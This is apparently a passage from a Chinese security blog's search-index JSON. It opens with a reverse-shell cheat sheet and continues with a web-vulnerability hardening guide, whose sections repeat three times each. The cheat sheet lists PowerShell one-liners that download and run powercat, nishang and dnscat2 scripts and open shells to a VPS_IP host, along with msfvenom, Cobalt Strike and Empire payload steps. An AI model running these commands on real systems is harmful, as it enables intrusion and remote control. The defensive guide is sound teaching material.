System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c VPS_IP -p 1234 -e cmd 下载到目标机器本地执行： PS C:\\WWW\u003e Import-Module ./powercat.ps1 PS C:\\WWW\u003e powercat -c VPS_IP -p 1234 -e cmd ","date":"2023-11-17","objectID":"/nc-shell/:5:2","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#powershell反弹"},{"categories":["web"],"content":"\rMSF反弹shell使用msfvenom生成相关Payload msfvenom -l payloads | grep 'cmd/windows/reverse' msfvenom -p cmd/windows/reverse_powershell LHOST=VPS_IP LPORT=1234 ","date":"2023-11-17","objectID":"/nc-shell/:5:3","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#msf反弹shell"},{"categories":["web"],"content":"\rCobalt strike反弹shell1、配置监听器：点击Cobalt Strike——\u003eListeners——\u003e在下方Tab菜单Listeners，点击add。 2、生成payload：点击Attacks——\u003ePackages——\u003eWindows Executable，保存文件位置。 3、目标机执行powershell payload ","date":"2023-11-17","objectID":"/nc-shell/:5:4","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#cobalt-strike反弹shell"},{"categories":["web"],"content":"\rEmpire反弹shell usestager windows/launcher_vbs info set Listener test execute ","date":"2023-11-17","objectID":"/nc-shell/:5:5","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#empire反弹shell"},{"categories":["web"],"content":"\rnishang反弹shell反弹TCPshell powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com /samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress VPS_IP -port 1234 反弹UDPshell powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellUdp.ps1'); Invoke-PowerShellUdp -Reverse -IPAddress VPS_IP -port 1234 ","date":"2023-11-17","objectID":"/nc-shell/:5:6","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#nishang反弹shell"},{"categories":["web"],"content":"\rDnscat反弹shell项目地址： https://github.com/iagox86/dnscat2github.com/iagox86/dnscat2 服务端： ruby dnscat2.rb --dns \"domain=lltest.com,host=xx.xx.xx.xx\" --no-cache -e open -e open 目标主机： powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');Start-Dnscat2 -Domain lltest.com -DNSServer xx.xx.xx.xx ","date":"2023-11-17","objectID":"/nc-shell/:5:7","series":null,"tags":["web"],"title":"关于弹shell","uri":"/nc-shell/#dnscat反弹shell"},{"categories":["web"],"content":"常见web漏洞加固策略 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:0:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#"},{"categories":["web"],"content":"\r1.SQL注入\rDescription​ Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。 Fix​ 代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。 使用参数化查询接口 对进入数据库的特殊字符（’”\u003c\u003e\u0026*;等）进行转义处理，或编码转换。 确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。 数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。 网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。 严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限 避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。 过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:1:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#1sql注入"},{"categories":["web"],"content":"\r1.SQL注入\rDescription​ Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。 Fix​ 代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。 使用参数化查询接口 对进入数据库的特殊字符（’”\u003c\u003e\u0026*;等）进行转义处理，或编码转换。 确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。 数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。 网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。 严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限 避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。 过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:1:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description"},{"categories":["web"],"content":"\r1.SQL注入\rDescription​ Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。 Fix​ 代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。 使用参数化查询接口 对进入数据库的特殊字符（’”\u003c\u003e\u0026*;等）进行转义处理，或编码转换。 确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。 数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。 网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。 严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限 避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。 过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:1:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix"},{"categories":["web"],"content":"\r2.XSS\rDescription​ Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。 Fix​ XSS漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义 过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” \u003c “，” \u003e “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。 不仅验证数据的类型，还要验证其格式、长度、范围和内容。 不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。 对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:2:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#2xss"},{"categories":["web"],"content":"\r2.XSS\rDescription​ Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。 Fix​ XSS漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义 过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” \u003c “，” \u003e “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。 不仅验证数据的类型，还要验证其格式、长度、范围和内容。 不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。 对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:2:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-1"},{"categories":["web"],"content":"\r2.XSS\rDescription​ Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。 Fix​ XSS漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义 过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” \u003c “，” \u003e “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。 不仅验证数据的类型，还要验证其格式、长度、范围和内容。 不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。 对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:2:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-1"},{"categories":["web"],"content":"\r3.XXE\rDescription​ XXE漏洞全称XML External Entity Injection即XML外部实体注入漏洞,XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。XEE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 Fix 检查所使用的底层XML解析库，默认禁止外部实体的解析 是若使用第三方应用代码,需要及时升级补丁 是对用户提交的XML数据进行过滤，如关键词：\u003c!DOCTYPE和\u003c!ENTITY或者SYSTEM和PUBLIC等 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:3:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#3xxe"},{"categories":["web"],"content":"\r3.XXE\rDescription​ XXE漏洞全称XML External Entity Injection即XML外部实体注入漏洞,XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。XEE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 Fix 检查所使用的底层XML解析库，默认禁止外部实体的解析 是若使用第三方应用代码,需要及时升级补丁 是对用户提交的XML数据进行过滤，如关键词：\u003c!DOCTYPE和\u003c!ENTITY或者SYSTEM和PUBLIC等 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:3:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-2"},{"categories":["web"],"content":"\r3.XXE\rDescription​ XXE漏洞全称XML External Entity Injection即XML外部实体注入漏洞,XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。XEE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 Fix 检查所使用的底层XML解析库，默认禁止外部实体的解析 是若使用第三方应用代码,需要及时升级补丁 是对用户提交的XML数据进行过滤，如关键词：\u003c!DOCTYPE和\u003c!ENTITY或者SYSTEM和PUBLIC等 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:3:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-2"},{"categories":["web"],"content":"\r4.CSRF\rDescription​ CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。 Fix 验证请求的Referer是否来自本网站（但可被绕过） 在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:4:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#4csrf"},{"categories":["web"],"content":"\r4.CSRF\rDescription​ CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。 Fix 验证请求的Referer是否来自本网站（但可被绕过） 在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:4:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-3"},{"categories":["web"],"content":"\r4.CSRF\rDescription​ CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。 Fix 验证请求的Referer是否来自本网站（但可被绕过） 在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:4:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-3"},{"categories":["web"],"content":"\r5.SSRF\rDescription​ SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。 ​ 这个漏洞造成的危害有： （1）可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息; （2）攻击运行在内网或本地的应用程序（比如溢出）; （3）对内网Web应用进行指纹识别，通过访问默认文件实现; （4）攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）; （5）利用File协议读取本地文件。 Fix 禁用不需要的协议，只允许HTTP和HTTPS请求，ban掉php伪协议如file://, gopher://, ftp:// 白名单的方式限制访问的目标地址，禁止对内网发起请求 过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 验证请求的文件格式 禁止跳转 限制请求的端口为http常用的端口，比如 80、443、8080、8000等 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:5:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#5ssrf"},{"categories":["web"],"content":"\r5.SSRF\rDescription​ SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。 ​ 这个漏洞造成的危害有： （1）可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息; （2）攻击运行在内网或本地的应用程序（比如溢出）; （3）对内网Web应用进行指纹识别，通过访问默认文件实现; （4）攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）; （5）利用File协议读取本地文件。 Fix 禁用不需要的协议，只允许HTTP和HTTPS请求，ban掉php伪协议如file://, gopher://, ftp:// 白名单的方式限制访问的目标地址，禁止对内网发起请求 过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 验证请求的文件格式 禁止跳转 限制请求的端口为http常用的端口，比如 80、443、8080、8000等 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:5:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-4"},{"categories":["web"],"content":"\r5.SSRF\rDescription​ SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。 ​ 这个漏洞造成的危害有： （1）可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息; （2）攻击运行在内网或本地的应用程序（比如溢出）; （3）对内网Web应用进行指纹识别，通过访问默认文件实现; （4）攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）; （5）利用File协议读取本地文件。 Fix 禁用不需要的协议，只允许HTTP和HTTPS请求，ban掉php伪协议如file://, gopher://, ftp:// 白名单的方式限制访问的目标地址，禁止对内网发起请求 过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 验证请求的文件格式 禁止跳转 限制请求的端口为http常用的端口，比如 80、443、8080、8000等 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:5:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-4"},{"categories":["web"],"content":"\r6.任意命令/代码执行\rDescription​ 命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。 Fix 严格过滤用户输入的数据，禁止执行非预期系统命令。 减少或不使用代码或命令执行函数 客户端提交的变量在放入函数前进行检测 减少或不使用危险函数 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:6:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#6任意命令代码执行"},{"categories":["web"],"content":"\r6.任意命令/代码执行\rDescription​ 命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。 Fix 严格过滤用户输入的数据，禁止执行非预期系统命令。 减少或不使用代码或命令执行函数 客户端提交的变量在放入函数前进行检测 减少或不使用危险函数 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:6:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-5"},{"categories":["web"],"content":"\r6.任意命令/代码执行\rDescription​ 命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。 Fix 严格过滤用户输入的数据，禁止执行非预期系统命令。 减少或不使用代码或命令执行函数 客户端提交的变量在放入函数前进行检测 减少或不使用危险函数 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:6:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-5"},{"categories":["web"],"content":"\r7.任意文件上传\rDescription　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。 Fix 对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测 MIME类型检测以及限制上传文件的大小等限制来防御 限制相关上传文件目录的执行权限，防止木马执行 严格限制上传的文件路径 文件扩展名在服务端白名单校验 文件内容服务端校验 隐藏上传文件路径 将上传的文件其他文件存储服务器中 重命名上传的文件 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:7:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#7任意文件上传"},{"categories":["web"],"content":"\r7.任意文件上传\rDescription　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。 Fix 对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测 MIME类型检测以及限制上传文件的大小等限制来防御 限制相关上传文件目录的执行权限，防止木马执行 严格限制上传的文件路径 文件扩展名在服务端白名单校验 文件内容服务端校验 隐藏上传文件路径 将上传的文件其他文件存储服务器中 重命名上传的文件 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:7:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-6"},{"categories":["web"],"content":"\r7.任意文件上传\rDescription　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。 Fix 对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测 MIME类型检测以及限制上传文件的大小等限制来防御 限制相关上传文件目录的执行权限，防止木马执行 严格限制上传的文件路径 文件扩展名在服务端白名单校验 文件内容服务端校验 隐藏上传文件路径 将上传的文件其他文件存储服务器中 重命名上传的文件 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:7:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-6"},{"categories":["web"],"content":"\r8.目录穿越/目录遍历\rDescription文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。 Fix 对传入的文件名参数进行过滤 判断是否是允许获取的文件类型 过滤回溯符../ ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:8:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#8目录穿越目录遍历"},{"categories":["web"],"content":"\r8.目录穿越/目录遍历\rDescription文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。 Fix 对传入的文件名参数进行过滤 判断是否是允许获取的文件类型 过滤回溯符../ ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:8:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-7"},{"categories":["web"],"content":"\r8.目录穿越/目录遍历\rDescription文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。 Fix 对传入的文件名参数进行过滤 判断是否是允许获取的文件类型 过滤回溯符../ ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:8:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-7"},{"categories":["web"],"content":"\r9.文件包含\rDescription　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。 Fix 严格检查变量是否已经初始化 对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符 严格检查文件包含函数中的参数是否外界可控 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:9:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#9文件包含"},{"categories":["web"],"content":"\r9.文件包含\rDescription　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。 Fix 严格检查变量是否已经初始化 对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符 严格检查文件包含函数中的参数是否外界可控 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:9:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-8"},{"categories":["web"],"content":"\r9.文件包含\rDescription　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。 Fix 严格检查变量是否已经初始化 对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符 严格检查文件包含函数中的参数是否外界可控 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:9:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-8"},{"categories":["web"],"content":"\r10.暴力破解\rDescription​ 于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。 Fix 如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险) 如果某个 IP登录次数超过设置的阈值，则锁定IP 增加人机验证机制 验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:10:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#10暴力破解"},{"categories":["web"],"content":"\r10.暴力破解\rDescription​ 于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。 Fix 如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险) 如果某个 IP登录次数超过设置的阈值，则锁定IP 增加人机验证机制 验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:10:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-9"},{"categories":["web"],"content":"\r10.暴力破解\rDescription​ 于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。 Fix 如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险) 如果某个 IP登录次数超过设置的阈值，则锁定IP 增加人机验证机制 验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:10:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-9"},{"categories":["web"],"content":"\r11.越权访问\rDescription​ 由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。 Fix 对用户访问角色的权限进行严格的检查及限制 在一些操作时可以使用session对用户的身份进行判断和控制 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:11:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#11越权访问"},{"categories":["web"],"content":"\r11.越权访问\rDescription​ 由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。 Fix 对用户访问角色的权限进行严格的检查及限制 在一些操作时可以使用session对用户的身份进行判断和控制 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:11:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#description-10"},{"categories":["web"],"content":"\r11.越权访问\rDescription​ 由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。 Fix 对用户访问角色的权限进行严格的检查及限制 在一些操作时可以使用session对用户的身份进行判断和控制 ","date":"2023-11-17","objectID":"/web_vulnerabilities_fix/:11:0","series":null,"tags":["web"],"title":"常见Web漏洞修复","uri":"/web_vulnerabilities_fix/#fix-10"},{"categories":["web"],"content":"\r12.未授权访问\rDescription​ 